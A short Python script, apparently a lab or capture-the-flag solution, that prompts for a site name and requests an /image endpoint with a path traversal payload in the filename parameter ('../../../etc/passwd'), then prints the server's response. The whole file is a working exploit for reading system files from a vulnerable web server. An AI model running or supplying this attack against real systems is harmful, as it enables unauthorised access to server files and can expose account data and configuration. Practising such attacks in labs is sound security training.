import requests

s = requests.Session()

site = input("Provide site link: ")  # Fixed the input line
url = f"https://{site}/image?filename=../../../etc/passwd"  # Constructs the URL
resp = s.get(url)
print(resp.text)
